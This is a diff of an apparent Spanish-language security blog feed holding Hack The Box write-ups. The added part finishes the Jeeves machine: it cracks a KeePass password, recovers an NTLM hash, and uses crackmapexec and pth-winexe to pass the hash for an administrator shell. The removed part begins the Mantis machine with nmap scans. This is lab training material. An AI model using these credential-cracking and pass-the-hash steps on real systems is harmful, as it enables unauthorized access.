+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KeePass &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA256 AES 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 6000 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
+Cost 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;version&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 2 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
+Cost 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;algorithm &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AES, &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TwoFish, &lt;span class=&quot;nv&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ChaCha]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 0 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
+Will run 8 OpenMP threads
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+moonshine1       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CEH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:08 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-10-11 15:33&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.1124g/s 6184p/s 6184c/s 6184C/s nick18..moonshine1
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos la contraseña &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;moonshine1&lt;/code&gt;, así que vamos a utilizarla y ver el contenido del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CEH.kdbx&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/jeeves-keepass1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Viendo los usuarios, tenemos uno de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; y tiene de contraseña &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&lt;/code&gt; que parece ser un hash NTLM; por lo que podríamos pensar que sería el hash del usuario &lt;strong&gt;Administrator&lt;/strong&gt;. Vamos a validarlo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.63 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'&lt;/span&gt;
+SMB         10.10.10.63     445    JEEVES           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10 Pro 10586 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:JEEVES&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:Jeeves&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SMB         10.10.10.63     445    JEEVES           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Jeeves&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que podemos hacer &lt;em&gt;pass the hash&lt;/em&gt; como el usuario &lt;strong&gt;Administrator&lt;/strong&gt; ya que tenemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[+]&lt;/code&gt; y al final un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(Pwn3d!)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ pth-winexe &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.10586]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;jeeves&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos administradores de la máquina y si tratamos de buscar la flag, vemos que no se encuentra en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Administrator\Desktop&lt;/code&gt;, pero tenemos una nota:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+ &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
+ Volume Serial Number is BE50-B1C9
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
+
+11/08/2017  10:05 AM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+11/08/2017  10:05 AM    &amp;lt;DIR&amp;gt;          ..
+12/24/2017  03:51 AM                36 hm.txt
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            833 bytes
+               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   7,530,254,336 bytes free
+
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;hm.txt
+The flag is elsewhere.  Look deeper.
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el mensaje que tenemos &lt;em&gt;The flag is elsewhere.  Look deeper.&lt;/em&gt;, podriamos estar pensando en &lt;a href=&quot;https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/&quot;&gt;&lt;strong&gt;&lt;em&gt;Alternate Data Streams&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;, por lo que si listamos otra vez con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/R&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /R
+ Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
+ Volume Serial Number is BE50-B1C9
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
+
+11/08/2017  10:05 AM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+11/08/2017  10:05 AM    &amp;lt;DIR&amp;gt;          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:&lt;span class=&quot;nv&quot;&gt;$DATA&lt;/span&gt;
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            833 bytes
+               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   7,527,256,064 bytes free
+
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora vemos el atributo  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hm.txt:root.txt:$DATA&lt;/code&gt;, que para visualizarlo, utilizamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;more&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; more &amp;lt; hm.txt:root.txt
+afbc5
+
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Powershell" /><summary type="html">Resolución de la máquina Jeeves en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Bastard</title><link href="http://localhost:4000/htb-bastard/" rel="alternate" type="text/html" title="Hack The Box Bastard" /><published>2021-10-09T00:00:00-05:00</published><updated>2021-10-09T00:00:00-05:00</updated><id>http://localhost:4000/htb-bastard</id><content type="html" xml:base="http://localhost:4000/htb-bastard/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bastard/banner-bastard.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;bastard&quot;&gt;Bastard&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.9.&lt;/p&gt;
@@ -4033,512 +4588,4 @@ whoami
 C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya con esto nos encontramos dentro de la máquina como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Patch_Management" /><summary type="html">Resolución de la máquina Granny en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Mantis</title><link href="http://localhost:4000/htb-mantis/" rel="alternate" type="text/html" title="Hack The Box Mantis" /><published>2021-09-19T00:00:00-05:00</published><updated>2021-09-19T00:00:00-05:00</updated><id>http://localhost:4000/htb-mantis</id><content type="html" xml:base="http://localhost:4000/htb-mantis/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-mantis/banner-mantis.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;mantis&quot;&gt;Mantis&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.52.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.52
-PING 10.10.10.52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.52&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.52: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;141 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.52 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 141.180/141.180/141.180/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.52 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-19 19:21 CDT
-Initiating SYN Stealth Scan at 19:21                                                                                             
-Scanning 10.10.10.52 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 53/tcp on 10.10.10.52    
-Discovered open port 445/tcp on 10.10.10.52
-Discovered open port 135/tcp on 10.10.10.52                                                                                      
-Discovered open port 139/tcp on 10.10.10.52                                                                                      
-Discovered open port 8080/tcp on 10.10.10.52
-Discovered open port 1433/tcp on 10.10.10.52    
-Discovered open port 38/tcp on 10.10.10.52     
-Discovered open port 49153/tcp on 10.10.10.52   
-Discovered open port 49166/tcp on 10.10.10.52   
-Discovered open port 464/tcp on 10.10.10.52     
-Discovered open port 9389/tcp on 10.10.10.52    
-Discovered open port 3268/tcp on 10.10.10.52    
-Discovered open port 49152/tcp on 10.10.10.52   
-Discovered open port 47001/tcp on 10.10.10.52   
-Discovered open port 49154/tcp on 10.10.10.52   
-Discovered open port 49164/tcp on 10.10.10.52   
-Discovered open port 3269/tcp on 10.10.10.52    
-Discovered open port 50255/tcp on 10.10.10.52   
-Discovered open port 49157/tcp on 10.10.10.52   
-Discovered open port 49168/tcp on 10.10.10.52   
-Discovered open port 1337/tcp on 10.10.10.52    
-Discovered open port 49155/tcp on 10.10.10.52   
-Discovered open port 88/tcp on 10.10.10.52      
-Discovered open port 636/tcp on 10.10.10.52     
-Discovered open port 593/tcp on 10.10.10.52     
-Discovered open port 49158/tcp on 10.10.10.52   
-Discovered open port 5722/tcp on 10.10.10.52    
-Completed SYN Stealth Scan at 19:21, 26.76s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.52                
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
-Scanned at 2021-09-19 19:21:03 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s      
-Not shown: 64173 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1335 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT      STATE SERVICE          REASON
-53/tcp    open  domain           syn-ack ttl 127
-88/tcp    open  kerberos-sec     syn-ack ttl 127
-135/tcp   open  msrpc            syn-ack ttl 127
-139/tcp   open  netbios-ssn      syn-ack ttl 127
-389/tcp   open  ldap             syn-ack ttl 127
-445/tcp   open  microsoft-ds     syn-ack ttl 127
-464/tcp   open  kpasswd5         syn-ack ttl 127
-593/tcp   open  http-rpc-epmap   syn-ack ttl 127
-636/tcp   open  ldapssl          syn-ack ttl 127
-1337/tcp  open  waste            syn-ack ttl 127
-1433/tcp  open  ms-sql-s         syn-ack ttl 127
-3268/tcp  open  globalcatLDAP    syn-ack ttl 127
-3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
-5722/tcp  open  msdfsr           syn-ack ttl 127
-8080/tcp  open  http-proxy       syn-ack ttl 127
-9389/tcp  open  adws             syn-ack ttl 127
-47001/tcp open  winrm            syn-ack ttl 127
-49152/tcp open  unknown          syn-ack ttl 127
-49153/tcp open  unknown          syn-ack ttl 127
-49154/tcp open  unknown          syn-ack ttl 127
-49155/tcp open  unknown          syn-ack ttl 127
-49157/tcp open  unknown          syn-ack ttl 127
-49158/tcp open  unknown          syn-ack ttl 127
-49164/tcp open  unknown          syn-ack ttl 127
-49166/tcp open  unknown          syn-ack ttl 127
-49168/tcp open  unknown          syn-ack ttl 127
-50255/tcp open  unknown          syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;27.02 seconds
-           Raw packets sent: 130159 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.727MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 78237 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.130MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.52
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,4
-       │ 9157,49158,49164,49166,49168,50255
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p53&lt;/span&gt;,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,4
-9164,49166,49168,50255 10.10.10.52 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-19 19:22 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.52       
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
-                                                                                                                                 
-PORT      STATE SERVICE      VERSION                    
-53/tcp    open  domain       Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15CD4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows Server 2008 R2 SP1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| dns-nsid:                                                     
-|_  bind.version: Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15CD4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                              
-88/tcp    open  kerberos-sec Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-09-20 00:27:33Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                       
-389/tcp   open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: HTB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-464/tcp   open  kpasswd5?                                       
-593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 
-636/tcp   open  tcpwrapped                                                                                                       
-1337/tcp  open  http         Microsoft IIS httpd 7.5
-|_http-server-header: Microsoft-IIS/7.5           
-| http-methods:                                                                                                                  
-|_  Potentially risky methods: TRACE                  
-|_http-title: IIS7                                              
-1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; RTM
-| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SSL_Self_Signed_Fallback
-| Not valid before: 2021-09-20T00:22:20                                                                                          
-|_Not valid after:  2051-09-20T00:22:20    
-|_ssl-date: 2021-09-20T00:28:41+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +4m46s from scanner time. 
-| ms-sql-ntlm-info:                                             
-|   Target_Name: HTB                                            
-|   NetBIOS_Domain_Name: HTB                                    
-|   NetBIOS_Computer_Name: MANTIS                 
-|   DNS_Domain_Name: htb.local                                                                                                   
-|   DNS_Computer_Name: mantis.htb.local           
-|_  Product_Version: 6.1.7601                                   
-3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-3269/tcp  open  tcpwrapped                                      
-5722/tcp  open  msrpc        Microsoft Windows RPC
